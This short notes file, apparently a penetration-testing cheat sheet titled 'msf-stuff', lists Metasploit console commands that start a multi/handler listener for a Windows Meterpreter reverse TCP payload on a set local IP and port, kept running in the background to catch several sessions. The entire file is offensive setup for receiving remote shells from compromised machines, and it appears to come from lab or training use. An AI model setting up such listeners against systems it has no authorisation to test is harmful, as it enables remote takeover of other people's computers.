# msf-stuff

# run multihandler listener on msf
msf>use exploit/multi/handler
msf>set payload windows/meterpreter/reverse_tcp
msf>set lhost <local IP> 10.11.0.248
msf>set lport <local port> 8080
msf> set ExitOnSession false
msf>exploit -j
  
  
